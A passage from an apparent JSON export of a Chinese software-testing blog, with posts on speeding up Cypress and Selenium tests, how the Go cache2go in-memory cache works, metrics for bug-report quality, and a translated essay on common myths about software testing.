8 9 10 11 12 13 14 15 it(\u0026#39;creates a milestone\u0026#39;, () =\u0026gt; { // 运行10秒 await createNewProject(); // 运行2秒 clickNewMilestoneButton(); newMilestoneDialog.clickSave(); newMilestoneDialog.should(\u0026#39;have.text\u0026#39;, \u0026#39;Milestone name is required\u0026#39;); // 运行3秒 clickNewMilestoneButton(); newMilestonDialog.getNameField().type(\u0026#39;February Milestone\u0026#39;); newMilestoneDialog.clickSave(); newMilestoneDialog.should(\u0026#39;have.text\u0026#39;, \u0026#39;New milestone saved\u0026#39;); }); 现在，整个测试套件只需要15秒就能完成。这意味着速度提高了40%！\n我还去掉了 beforeEach。当你在一个 describe 块内只有一个 it 时，它是不必要的心理负担。\n我们仍然在测试相同的功能，但我们承认了这样一个事实，即我们最初创建的隔离水平并不值得花费 CI 时间。我们可以用 60% 的 CI 时间来测试错误信息和成功保存，其信心与以前一样。\n在我们的真实场景中，像这样的变化在整个应用中严重影响了我们的构建性能。\n我们可以让 CI 时间从 11-17 分钟变成 9 分钟以下的构建时间。\n我们在有限的 CI 时间内运行这个项目，所以 40% 的速度提升意味着我们可以在相同的预算下为客户多运行 40% 的构建。\n写在最后 原文地址在这里：https://akoskm.com/how-to-speed-up-your-integration-tests\n这篇文章除了开头部分是我写的之外，其他部分来自\n直接使用notion AI把英文翻译成中文 使用DeepL把英文翻译成中文，再使用Notion AI进行改写 翻译有些不着边际的地方，我会进行一点点修改 我发现AI翻译的效果以及改写的通顺度比我自己翻译的要好的多。\n果然，未来已来。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E5%8A%A0%E9%80%9F%E6%89%A7%E8%A1%8C%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95/","title":"如何加速执行集成测试"},{"content":"这两天正好看到一个用go实现的线程安全的内存缓存，实现代码非常简洁高效，不卖弄不烧脑，非常值得初学者拿来学习。\n项目地址 项目地址在https://github.com/muesli/cache2go，目前已经有1.8k的star。\n如何使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package main import ( \u0026#34;github.com/muesli/cache2go\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) // Keys \u0026amp; values in cache2go can be of arbitrary types, e.g. a struct. type myStruct struct { text string moreData []byte } func main() { // Accessing a new cache table for the first time will create it. cache := // We will put a new item in the cache. It will expire after // not being accessed via Value(key) for more than 5 seconds. val := myStruct{\u0026#34;This is a test!\u0026#34;, []byte{}} cache.Add(\u0026#34;someKey\u0026#34;, 5*time.Second, \u0026amp;val) // Let\u0026#39;s retrieve the item from the cache. res, err := cache.Value(\u0026#34;someKey\u0026#34;) if err == nil { fmt.Println(\u0026#34;Found value in cache:\u0026#34;, res.Data().(*myStruct).text) } else { fmt.Println(\u0026#34;Error retrieving value from cache:\u0026#34;, err) } // Wait for the item to expire in cache. time.Sleep(6 * time.Second) res, err = cache.Value(\u0026#34;someKey\u0026#34;) if err != nil { fmt.Println(\u0026#34;Item is not cached (anymore).\u0026#34;) } // Add another item that never expires. cache.Add(\u0026#34;someKey\u0026#34;, 0, \u0026amp;val) // cache2go supports a few handy callbacks and loading mechanisms. cache.SetAboutToDeleteItemCallback(func(e *cache2go.CacheItem) { fmt.Println(\u0026#34;Deleting:\u0026#34;, e.Key(), e.Data().(*myStruct).text, e.CreatedOn()) }) // Remove the item from the cache. cache.Delete(\u0026#34;someKey\u0026#34;) // And wipe the entire cache table. cache.Flush() } 简单看一下核心api\n创建缓存对象: cache2go.Cache(\u0026quot;myCache\u0026quot;) 设置一个key:value对：cache.Add(\u0026quot;someKey\u0026quot;, 5*time.Second, \u0026amp;val) 设置的时候需要指定缓存的过期时间 获取key对应的value值: res, err = cache.Value(\u0026quot;someKey\u0026quot;) 这里就简单分析一下对应接口的实现原理。\nkey value存储 这里使用的是CacheItem这个结构体来实现的key value存储。相应的数据结构是\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // CacheItem is an individual cache item // Parameter data contains the user-set value in the cache. type CacheItem struct { sync.RWMutex // The item\u0026#39;s key. key interface{} // The item\u0026#39;s data. data interface{} // How long will the item live in the cache when not being accessed/kept alive. lifeSpan time.Duration // Creation timestamp. createdOn time.Time // Last access timestamp. accessedOn time.Time // How often the item was accessed. accessCount int64 // Callback method triggered right before removing the item from the cache aboutToExpire []func(key interface{}) } 值得注意的点有\n读写锁: sync.RWMutex 多线程访问的时候用来进行资源的排他锁定 键的实现: key interface{} 所以key可以是任意类型 值的实现: data interface{} 跟key类似，value可以是任意类型 存活时间: lifeSpan time.Duration 大于这个时间间隔没有被访问的话，的话key就会过期被清理 上次被访问的时间: accessedOn time.Time key被访问的次数: accessCount 再看一下CacheItem初始化的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // NewCacheItem returns a newly created CacheItem. // Parameter key is the item\u0026#39;s cache-key. // Parameter lifeSpan determines after which time period without an access the item // will get removed from the cache. // Parameter data is the item\u0026#39;s value. func NewCacheItem(key interface{}, lifeSpan time.Duration, data interface{}) *CacheItem { t := time.Now() return \u0026amp;CacheItem{ key: key, lifeSpan: lifeSpan, createdOn: t, accessedOn: t, accessCount: 0, aboutToExpire: nil, data: data, } } 可以看出来创建时间和上次访问时间都被设置成了当前时间，访问次数是0.\n缓存对象的实现CacheTable CacheTable对象包含了n个CacheItem，看一下具体的数据结构\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 type CacheTable struct { sync.RWMutex // The table\u0026#39;s name. name string // All cached items. items map[interface{}]*CacheItem // Timer responsible for triggering cleanup. cleanupTimer *time.Timer // Current timer duration. cleanupInterval time.Duration // The logger used for this table. logger *log.Logger // Callback method triggered when trying to load a non-existing key. loadData func(key interface{}, args ...interface{}) *CacheItem // Callback method triggered when adding a new item to the cache. addedItem []func(item *CacheItem) // Callback method triggered before deleting an item from the cache. aboutToDeleteItem []func(item *CacheItem) } 这里需要关注的地方是\nitems map[interface{}]*CacheItem : 每个item其实都是这个map里的一项，其实map的key就是item的key cleanupTimer *time.Timer : 用来做缓存过期的定时器 cleanupInterval time.Duration ： 扫描所有的items进行缓存过期清理的时间间隔 添加一个key value 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 // Add adds a key/value pair to the cache. // Parameter key is the item\u0026#39;s cache-key. // Parameter lifeSpan determines after which time period without an access the item // will get removed from the cache. // Parameter data is the item\u0026#39;s value. func (table *CacheTable) Add(key interface{}, lifeSpan time.Duration, data interface{}) *CacheItem { item := NewCacheItem(key, lifeSpan, data) // Add item to cache. table.Lock() table.addInternal(item) return item } func (table *CacheTable) addInternal(item *CacheItem) { // Careful: do not run this method unless the table-mutex is locked! // It will unlock it for the caller before running the callbacks and checks table.log(\u0026#34;Adding item with key\u0026#34;, item.key, \u0026#34;and lifespan of\u0026#34;, item.lifeSpan, \u0026#34;to table\u0026#34;, table.name) table.items[item.key] = item // Cache values so we don\u0026#39;t keep blocking the mutex. expDur := table.cleanupInterval addedItem := table.addedItem table.Unlock() // Trigger callback after adding an item to cache. if addedItem != nil { for _, callback := range addedItem { callback(item) } } // If we haven\u0026#39;t set up any expiration check timer or found a more imminent item. if item.lifeSpan \u0026gt; 0 \u0026amp;\u0026amp; (expDur == 0 || item.lifeSpan \u0026lt; expDur) { table.expirationCheck() } } 梳理一下流程\n创建cache item 加读写锁 调用addInternal 方法 在items map里添加一项，key就是item的key，value就是item 获取整个CacheTable的清理缓存间隔时间 解锁，到这一步基本上就完成了数据的持久化 运行添加item时的回调函数，如果有的话 如果item设置了过期时间，并且table的过期扫描间隔是0（首次添加）或者item的过期间隔小于table的过期间隔时间的话，调用expirationCheck 函数，进行过期扫描 扫描并清理过期的key 代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // Expiration check loop, triggered by a self-adjusting timer. func (table *CacheTable) expirationCheck() { table.Lock() if table.cleanupTimer != nil { table.cleanupTimer.Stop() } if table.cleanupInterval \u0026gt; 0 { table.log(\u0026#34;Expiration check triggered after\u0026#34;, table.cleanupInterval, \u0026#34;for table\u0026#34;, table.name) } else { table.log(\u0026#34;Expiration check installed for table\u0026#34;, table.name) } // To be more accurate with timers, we would need to update \u0026#39;now\u0026#39; on every // loop iteration. Not sure it\u0026#39;s really efficient though. now := time.Now() smallestDuration := 0 * time.Second for key, item := range table.items { // Cache values so we don\u0026#39;t keep blocking the mutex. item.RLock() lifeSpan := item.lifeSpan accessedOn := item.accessedOn item.RUnlock() if lifeSpan == 0 { continue } if now.Sub(accessedOn) \u0026gt;= lifeSpan { // Item has excessed its lifespan. table.deleteInternal(key) } else { // Find the item chronologically closest to its end-of-lifespan. if smallestDuration == 0 || lifeSpan-now.Sub(accessedOn) \u0026lt; smallestDuration { smallestDuration = lifeSpan - now.Sub(accessedOn) } } } // Setup the interval for the next cleanup run. table.cleanupInterval = smallestDuration if smallestDuration \u0026gt; 0 { table.cleanupTimer = time.AfterFunc(smallestDuration, func() { go table.expirationCheck() }) } table.Unlock() } 简单过一起逻辑\n加读写锁 如果启动了扫描定时器，关闭定时器先 扫描所有的key，对每一个key 加读锁 获取key的存活周期 获取key的上次访问时间 如果存活周期是0，则不处理，这是持续保活的逻辑，可以先不管 如果现在的时间距离上次访问时间已经大于了key的存活时间，则删除这个key 否则的话算出所有key里面最快要到期的那个key的时间间隔 如果有拿到了最快要到期那个key的时间间隔，则运行定时器，在下这个时间间隔之后运行清理函数 解锁 删除key的实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // Delete an item from the cache. func (table *CacheTable) Delete(key interface{}) (*CacheItem, error) { table.Lock() defer table.Unlock() return table.deleteInternal(key) } func (table *CacheTable) deleteInternal(key interface{}) (*CacheItem, error) { r, ok := table.items[key] if !ok { return nil, ErrKeyNotFound } // Cache value so we don\u0026#39;t keep blocking the mutex. aboutToDeleteItem := table.aboutToDeleteItem table.Unlock() // Trigger callbacks before deleting an item from cache. if aboutToDeleteItem != nil { for _, callback := range aboutToDeleteItem { callback(r) } } r.RLock() defer r.RUnlock() if r.aboutToExpire != nil { for _, callback := range r.aboutToExpire { callback(key) } } table.Lock() table.log(\u0026#34;Deleting item with key\u0026#34;, key, \u0026#34;created on\u0026#34;, r.createdOn, \u0026#34;and hit\u0026#34;, r.accessCount, \u0026#34;times from table\u0026#34;, table.name) delete(table.items, key) return r, nil } 删除的逻辑相对简单一些，主要是需要注意加锁解锁以及运行之前注册的回调函数。\n总结 这应该是我见过代码最简单但是star相对比较多的开源项目了。这个项目非常适合我们进行学习，因为\n可以帮助我们理解锁的使用以及如何使用锁来保证线程安全； 帮助我们理解key value内存缓存的实现 提供了一种使用定时器来实现定时任务的思路 帮助我们理解如何注册和运行回调函数 ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E5%86%85%E5%AD%98%E7%BC%93%E5%AD%98/","title":"如何实现线程安全的内存缓存"},{"content":"作为测试同学我们会经常苦恼如何使用一些指标来度量版本或产品的质量情况，近些年来比较主流的声音可能变成了如何使用指标来度量研发效率，以及如何在不影响线上质量的前提下提高研发效率，降低交付周期，不过今天我却听到了不同的声音，无意中浏览到一篇文章，讲的是如何去度量测试同学提的bug本身的质量情况。\n先上图，先看看在这形形色色的图表下隐藏有哪些通用指标。\nBugs Integrity Level 就是上面那4个圈，颜色越绿就代表bug的完整性越好，也就是提出的bug的质量越高。\nDev Efficiency - Bugs per resolution with drill across 中间位置左边的那几个柱状图，这里汇总了下面一些信息。\n绿色部分：开发解决了的bug，也就是这些bug被开发接受，并被测试验证过了 非绿色部分表示的是被开发拒绝的bug，其中拒绝理由有下面4种 Works as designed (WAD)：这不是bug，产品设计就是如此 Ir-reproducible：无法复现 Environment：环境问题，嗯，是不是很亲切 Duplicated：重复的问题 Dev Efficiency - % Rejected 中间部分靠右的4个圈，按季度统计了bug的被拒绝率，颜色越深拒绝率越高。\nAverage time in status - bug bug在特定的生命周期停留的平均时间，不过作者也说了，他们仅将其视为一种晴雨表，把这个当成硬指标，因为并非所有状态都掌握在 QA 手中，而且创建这个bug的人其实并不总是对bug的所有状态负责。用过jira的同学可能会这个图表会有些印象。\nBugs integrity - number of missing fields 这部分是对字段不完整的bug的统计。我们先看一下作者公司的提bug模版。\nDescription：bug描述 Steps to Reproduce：重现步骤 Expected results： 预期结果 Actual results：实际结果 这个图表展示了所有创建了的bug数量以及缺失具体字段的bug数量，看上去还是很清晰的。不过我会有一些疑问，如果1个bug这些字段都缺失了，那么这个bug会不会被重复算到每一种具体的缺失分类中去？另外为什么这些字段不能设置成必填？\nBugs integrity - % perfect bugs 这里展示了字段完整的bug比例，也就是完美的bug的比例。\n# UI bugs without visual attachment 如果某个bug跟ui相关，那么我们会期望提bug的时候带上截图或者录屏，这里就是展示的没有放图的ui bug比例，如果这个比例高于10%那么bug的质量就是异常的。\nunnecessary ping pong 这个指标很有意思，结合现在比较主流的微服务架构来看，每个具体的业务服务都按照一定规律被打散拆小，每个服务高度自制，服务之间基本是相互隔离的，开发人员很多情况下只对自己负责的服务负责。但是测试人员却是站在整个业务的高度去提bug，他可能只知道某个功能不可用，但不一定知道是哪个具体的微服务不可用，比如测试同学发现外卖系统中无法下单，这个bug可能是鉴权微服务出了问题，也可能是订单微服务存在异常，正常工作的系统总是类似的，系统不正常的时候同一个表象背后的原因可能会是五花八门。\n上面这个指标的意思就是测试人员在提出bug的时候直接指出是哪个微服务出了问题，这样就能减少不必要的沟通成本，提升bug修复的效率。这里猜对了就加分，猜错了就减分。\n总结 总的来说这些指标还是比较实在的，特别是猜微服务那部分挺有新意，另外这个面板是使用jira的eazyBI插件来实现的，在统计缺字段的bug时还用到了ScriptRunner插件。当产品质量趋于稳定或者工作中没有亮点的时候，大家可以试着祭出这些指标，因为有指标就有kpi，有kpi就有产出了吧。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E7%94%A8%E6%8C%87%E6%A0%87%E5%8E%BB%E5%BA%A6%E9%87%8Fbug%E6%9C%AC%E8%BA%AB%E7%9A%84%E8%B4%A8%E9%87%8F%E6%83%85%E5%86%B5/","title":"如何用指标去度量bug本身的质量情况"},{"content":"让自动化测试脚本正常工作只是自动化测试的第一步，由于自动化脚本会经常执行并更新，因此测试脚本需要\n可以快速执行 容易维护 容易阅读 本文会提供一些让selenium自动化脚本运行的更快的技巧。\n在page_source中断言text比直接使用text属性断言要快 我们经常会需要断言页面中的某个部分包含一些具体的文本，下面的语句的输出结果是相同的\n1 2 driver.page_source driver.find_element(:tag_name =\u0026gt; ‘body\u0026#39;) . 不过对于第二条语句来说，selenium需要去分析页面的结构，最后再找到对应的元素并输入结果，这显然是需要花费时间的。如果页面比较小的化，那么二者的差距可能不大，不过对于大的页面来说，第一条语句速度明显会更快一些。\n使用page text的情况\n1 expect(driver.find_element(:tag_name =\u0026gt; \u0026#34;body\u0026#34;).text).to include(\u0026#34;platform- and language-neutral wire protocol\u0026#34;) 使用 page source的情况\n1 expect(driver.page_source).to include(\u0026#34;platform- and language-neutral wire protocol\u0026#34;) 来看一下差距\n1 2 Method 1: Search whole document text took 0.823076 seconds Method 2: Search whole document HTML took 0.039573 seconds 当然两者的使用场景是不太相同的，不过我们这里只关注性能，显然page source要更快速一些。\n元素越具体，获取text的速度越快 根据经验，我们可以通过缩小更具体的 Web 控件的范围来节省执行时间。下面的两个断言语句在很大程度上实现了相同的功能，但在执行时间上有很大的不同。\n1 expect(driver.find_element(:tag_name, “body”).text).to include(“language-neutral wire”) 这条语句的执行时间是0.93s\n1 expect(driver.find_element(:id, “abstract”).text).to include(“language-neutral wire”) 这个断言只执行了0.02s\n很明显，第2个断言除了在执行速度上更快之外，断言也更加精确，更容易理解。\n使用变量去缓存没有变化的元素 我经常看到有人编写如下测试来检查页面上的多个文本。\n1 2 3 driver.navigate.to(site_url + \u0026#34;/WebDriverStandard.html\u0026#34;) expect(driver.find_element(:tag_name, \u0026#34;body\u0026#34;).text).to include(\u0026#34;Firefox\u0026#34;) expect(driver.find_element(:tag_name, \u0026#34;body\u0026#34;) \u0026#34;).text).to include(\u0026#34;chrome\u0026#34;) expect(driver.find_element(:tag_name, \u0026#34;body\u0026#34;).text).to include(\u0026#34;W3C\u0026#34;) 执行时间2.35s\n上述三个测试语句非常低效，因为每个测试语句都调用driver.find_element(:tag_name, 'body').text，当网页很大时，这可能是费时费力的工作。\n解决方案：使用一个变量来存储网页的文本，这是编程中很常见的做法。\n1 2 3 the_page_text = driver.find_element(:tag_name, “body”).text expect(the_page_text).to include(\u0026#34;Firefox\u0026#34;) expect(the_page_text).to include(\u0026#34;chrome\u0026#34;) expect(the_page_text).to include(\u0026#34;W3C\u0026#34; ) 执行速度0.86s\n无论我们在该页面上执行了多少断言（针对页面文本），只要我们检查的页面文本没有改变，我们都会获得恒定的执行时间。\n快速在文本框中输入大文本 我们通常用来send_keys在文本框中输入文本。当您发现要输入的文本字符串很大，例如数千个字符时，尽量避免使用，send_keys因为它不高效。下面是一个例子：\n1 2 3 long_str = “START” + ‘0’ * 1024 * 5 + “END” # just over 5K text_area_elem = driver.find_element(:id, “comments”) text_area_elem.send_keys(long_str) 执行时间3.8s\n其实解决方案很简单，用js来做\n1 driver.execute_script(“document.getElementById(\u0026#39;comments\u0026#39;).value = arguments[0];”, long_str) 执行时间0.2s\n使用动态等待进行动态/AJAX 操作而不是固定睡眠 对于一些前后端分离的页面，由于操作之间页面不会刷新，我们就不能依赖selenium自带的页面刷新等待机制，所以我们经常需要去等待一个元素出现或者消失，下面的代码演示了这个过程。\n1 2 3 driver.find_element(:xpath,\u0026#34;//input[ @value =\u0026#39;Pay now\u0026#39;]\u0026#34;).click sleep 10 # seconds expect(driver.find_element(:id, \u0026#34;bn\u0026#34;).text).to include(\u0026#34;RN #\u0026#34;) 这样无论这个页面的流畅程度如何，上面的代码都至少需要执行10s，一个用例的话10s可以接受，但如果大部分用例里都有固定等待时间，那整个测试执行的过程将是非常缓慢的。\n解决方案是使用动态等待。\n1 2 wait = Selenium::WebDriver::Wait.new(:timeout =\u0026gt; 10) # seconds wait.until{ driver.find_element(:id, \u0026#34;bn\u0026#34;).text.include?(\u0026#34;RN#\u0026#34;) } 最后 如果用例是一个接一个串行执行的话，那么执行速度可以优化的空间也是有上限的，更好的方案是多组用例一起执行，多一些执行机，把串行该成并行，这样的优化效果将更加明显。总之时间太长，就想办法堆机器吧。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96selenium-webdriver%E7%9A%84%E6%89%A7%E8%A1%8C%E9%80%9F%E5%BA%A6/","title":"如何优化selenium webdriver的执行速度"},{"content":"这是最近看到的一篇比较有意思的文章，原文在这里：https://medium.com/geekculture/seven-unspoken-truths-about-software-tests-4bcf0f720a04，简单的加工翻译了一下，其中（）里的内容是我为了帮助大家理解夹带的私货，希望这篇文章会对大家有所启示。\n1，当你是一个项目的的测试负责人的时候，你有没有过质问过项目成员为什么没测试出某个具体的bug，或者因为某人没有测出bug而直接责备他？\n2，当你提升了测试覆盖率的时候你有没有发现产品的bug数量其实没有发生变化？\n3，你有没有在发布之前花费了大量的时间去进行测试却最终发现一无所获，而发布之后bug却不期而至？\n4，开发可以测试他们自己的代码吗？\n5，bug真的是发现的越晚修复成本就越高吗？\n6，你有没有过以不按套路出牌的方式来进行软件的测试，并称之为“探索性测试”？\n7，你是否需要通过QA活动来提升产品质量？\n真相1：测试并不能找出所有的bug 很不幸这是真的，没有任何一种测试方式可以保证找出所有的bug。\n一些测试活动跟直接上手点点点相比确实效率要低一些，所以我们可以不用那么关注测试的类型，相反我们要做的是选择合适的测试类型并综合使用，从而以最少的工作量打到较好的效果。（比如ui的自动化测试如果要做到非常复杂那么将花费相当大的开发和维护成本，但没有ui的自动化，每轮测试都靠人肉点来点去也不现实，所以比较合适的做法是一些稳定的核心路径可以用ui自动化去实现，平衡投入产出比，用较少的工作量达到效率最大化）\n当有人抱怨为什么测试没有发现某些问题的时候麻烦提醒他们：测试确实没有办法保证一定会发现某些特定的缺陷。\n我们会经常复盘测试的漏测情况，很不幸，这是落后的想法，这就像是在魔术揭秘了之后再马后炮的说其实这个戏法很简单，很容易被识破一样。事后做漏测复盘并不是一个有效的分析手段。\n永远不要责备测试工程师，他们并没有写出bug，相反，他们一直在努力找出开发过程中引入的缺陷。没有什么是完美的，测试同学在接受现实的同时也需要记住千万别立flag，因为测试不可能发现所有的bug。\n真相2：测试覆盖率与测试的效果几乎没有相关性 是的，你没有看错。我们已经有足够的科学证据表明，增加单元测试覆盖率不一定会提高我们测试套件发现bug的效率！也许是时候关注与测试相关的内容而不是正在测试的代码量了。（这里作者的原话是We already have enough scientific evidence to say that increasing unit test coverage may not necessarily increase your test suite effectiveness in finding defects!直译过来就是单元覆盖率的提升并不会提升测试套件发现缺陷的效率，说实话，我觉得单元测试覆盖率跟测试中发现bug的效率本来就没有什么关系，覆盖率代表的是代码被测试的程度，而发现bug的效率指的是时间和产出的关系，发现bug的效率高并不代表着产品的质量就好，反之亦然。不过看下文引用资料时的描述，我们可以看到作者的举证基本上都透露了一个信息，那就是单元测试覆盖率与bug的数量之前没有太多的关联，换句话说就是并不是单元测试覆盖率越高，产品的质量就越好，因为产品的质量好一般意味着可被观察到的bug相对少，而bug又跟单元测试覆盖率无关。这里为了严谨，作者的引用我就不做翻译了。）\n*A. Mockus, N. Nagappan, and T.T. Dinh-Trong, “Test Coverage and Post-verification Defects: A Multiple Case Study,” Proc. 3rd Int’l Symp. Empirical Software Eng. and Measurement (ESEM 09), 2009, pp. 291–301.*The correlation between coverage and defects was none or very weak. Moreover, the effort required to increase the coverage from a certain level to 100% increased exponentially. *M.R. Lyu, J. Horgan, and S. London, “A Coverage Analysis Tool for the Effectiveness of Software Testing,” IEEE Trans. Reliability, vol. 43, no. 4, 1994, pp. 527–535.*Qualitative analysis found no association between the defects and coverage. *B. Smith and L.A. Williams, A Survey on Code Coverage as a Stopping Criterion for Unit Testing, tech. report TR-2008–22, Dept. of Computer Science, North Carolina State Univ., 2008, pp. 1–6.*The results did not support the hypothesis of a causal dependency between test coverage and the number of defects when testing intensity was controlled for. *L. Briand and D. Pfahl, “Using Simulation for Assessing the Real Impact of Test Coverage on Defect Coverage,” Proc. 10th Int’l Symp. Software Reliability Eng., 1999, pp. 148–157.*The results did not support the hypothesis of a causal dependency between test coverage and the number of defects when testing intensity was controlled for. *P.S. Kochhar, F. Thung, and D. Lo, “Code Coverage and Test Suite Effectiveness: Empirical Study with Real Bugs in Large Systems,” Proc. IEEE 22nd Int’l Conf. Software Analysis, Evolution, and Reengineering (SANER 15), 2015, pp. 560–564.*A moderate to strong correlation was found between coverage and defects. However, the coverage was manipulated and calculated manually. *L. Inozemtseva and R. Holmes, “Coverage Is Not Strongly Correlated with Test Suite Effectiveness,” Proc. 36th Int’l Conf. Software Eng. (ICSE 14), 2014, pp. 435–445.*A weak to moderate correlation was found between coverage and defects. The type of coverage did not have an impact on the results. *X. Cai and M.R. Lyu, “The Effect of Code Coverage on Fault Detection under Different Testing Profiles,” ACM SIGSOFT Software Eng. Notes, vol. 30, no. 4, 2005, pp. 1–7.*A moderate correlation was found between coverage and defects, but the defects were artificially introduced. The correlation was different for different testing profiles. *G. Gay et al., “The Risks of Coverage-Directed Test Case Generation,” IEEE Trans. Software Eng., vol. 41, no. 8, 2015, pp. 803–819.*Coverage measures were weak indicators for test suite adequacy. High coverage did not necessarily mean effective testing. 真相3：测试工作量呈指数增加 许多消息来源指出，测试人员会在测试活动开始时发现更多缺陷，而在结束时发现缺陷则更少。有迹象表明，为了找到下一个缺陷，增加覆盖率和执行测试的工作量呈指数增长。\n在论文“Test Coverage and Post-verification Defects: A Multiple Case Study,” (A. Mockus, N. Nagappan, and T.T. Dinh-Trong, Proc. 3rd Int’l Symp. Empirical Software Eng. and Measurement (ESEM 09), 2009, pp. 291–301.)中透露：将覆盖率从某个水平增加到 100% 所需的努力呈指数增长。\n根据“Implementing automated software testing: How to save time and lower costs while raising quality.” (Dustin, E., Garrett, T., \u0026amp; Gauf, B. (2009). Pearson Education.),的阐述：软件可靠性模型表明，随着在测试中投入更多时间，每单位时间发现的缺陷数量呈指数减少。\n真相4：开发者偏差 如果开发人员在开发阶段直接把一个需求理解错了，那么他写出来的代码就是错的，对于测试人员来说情况也一样。\n如果开发同学直接忘记在代码中处理某些情况，比如特定的条件验证，那么他也很可能不会记得对这种场景进行测试。\n为了避免这种情况，开发人员可以互相测试彼此的代码，但他们最好不要测试自己的代码，这就是所谓的交叉测试。\n在没有设计任何测试用例的情况下，开发同学还是可以测试自己的代码的，这样就可以尽可能的避免一些先入为主的偏差。\n测试驱动开发可能会降低开发忘记做某事概率，但不会减少误解某些需求的概率。\n真相5：晚期发现的缺陷可能不会花费更多来修复 这是非常反直觉的，因为人们可能习惯于看到这样的图片：\n这上面的数字可能是有水分的，Laurent Bossavit 是巴黎软件咨询公司 CodeWorks 的敏捷方法论专家和技术顾问，他在github上的文章“Degrees of intellectual dishonesty”就透露了这些信息可能是被捏造出来的。\n在一篇名为“Are delayed issues harder to resolve? Revisiting cost-to-fix of defects throughout the lifecycle” (Menzies, T., Nichols, W., Shull, F. et al. Empir Software Eng 22, 1903–1935 (2017) https://doi.org/10.1007/s10664-016-9469-x)的论文指出：没有发现任何证据表明在代码投入生产后进行缺陷的修复需要花费更长的时间。\n论文“What We Have Learned About Fighting Defects” (Forrest Shull, Vic Basili, Barry Boehm, et al., Proceedings of the 8th International Symposium on Software Metrics (METRICS ‘02). IEEE Computer Society, USA, 249. 2002.)中，作者指出：修复某些非关键bug的成本在整个生命周期阶段几乎保持不变（项目早期平均 1.2 小时，项目后期平均 1.5 小时）。\n不过很多的研究都在度量定位错误和修复bug的工作量，那么他们忽略了什么？\n回归测试：在发布之前我们要进行频繁的回归，为了验证某些重要的bug已经被修复了，我们就需要一次又一次的对主流程甚至是大部分的逻辑进行回归测试，这显然是很巨大的工作量； 机会成本：在项目的晚期发现问题的时候，很多人往往会将bug排到下一个版本或项目，这很可能导致项目延期交付； 企业商誉成本：企业可能会被罚款，客户可能会亏钱，用户体验自然也就不好。2020 年 12 月，游戏《赛博朋克 2077》因发售时出现诸多技术问题而从索尼商店下架。索尼提供全额退款。随后，开发商CD Projekt Red宣布对PS4和Xbox玩家进行退款。在投资者电话会议上，CD Projekt Red 表示“与恢复公司声誉相比，《赛博朋克 2077》修复的成本“无关紧要”。该公司的股票已从 2020 年 12 月的每股 31 美元跌至 2021 年 6 月的每股 10 美元。 bug并不是在代码中引入的。比如在项目的初期做技术设计的时候就存在缺陷，或者需求本身就是个bug，那么越晚发现灾难就越大。 因此，虽然发布后修复代码错误的工作量可能不会增加那么多，但早期修复bug可以节省大量精力、金钱和麻烦。\n真相6：探索性测试需要流程和文档 很多人认为如果他们对产品做一些无法预料结果的操作，比如在表单胡乱输入并且提交，那么他们就是在做探索性测试。\n其实探索性测试并不意味着你要对系统或者产品做一些特别的事情，它往往意味着我们需要了解系统是如何真正工作的，并且与普通的功能测试同时进行。\n换句话说探索性测试可以（并且最好应该）得到现有文档的支持，例如需求文档和设计文档。这里的区别在于探索性测试的测试用例不是预先编写好的。\n探索性测试可以脚本化，一旦发现问题就可以把bug记录在案，然后可重复执行的脚本又可以在后面的测试过程中反复使用。（比如探索测试时可以使用浏览器自带的录制功能，发现bug之后就把录制好的脚本保存下来，给后面的回归测试使用，chrome现在已经自带了录制能力了）。\n测试用例仍然应该使用边界值分析、等价类划分等技术来设计。我们没有理由设计一些随机的测试用例，因为它们在检测缺陷方面可能不具有成本优势或有效性。\n真相7：改进流程中的非质量保证活动可以提高产品质量 （这里原文的论述我实在是没弄明白并且找不到合适的数据支持，所以就简单的粘贴英文版本了）\nA 2009 study in Brazil (in Portuguese) involving 135 software development organizations had their capacity to identify and fix defects increased by improving their processes. These companies were part of a Brazilian software process improvement program called “MPS.Br,” where they should adhere to a software process improvement model (the MPS Model).\nThis model has stages, and 58 of these companies were in the first stage, where they were required to improve their Project Management and Requirements Management processes.\nWhile it’s unclear why this happened, we can reasonably expect that projects that identify the right people to participate in the team, training needs, and proper budget and schedule will likely have the people, the time, and other resources to improve quality.\n奖励关（有趣的事实）：百慕大计划 好吧，这是一个有趣的，但没有解释的事实，它可能真的不起作用。\n百慕大计划是更快完成项目的战略名称。将团队的一部分派往百慕大（即，将他们从项目中移除），项目会更快完成。\n它被认为是对布鲁克斯定律（Brooks’s law）的回应（对软件项目管理的一种观察，根据该定律，“在延期的软件项目中增加人力会让项目交付的更慢一些”）。那么，如果您移除人员，项目是否应该进行的更加迅速？\n根据我的经验，加入团队的每个新人都会占用一个老人工作时间的 1/3 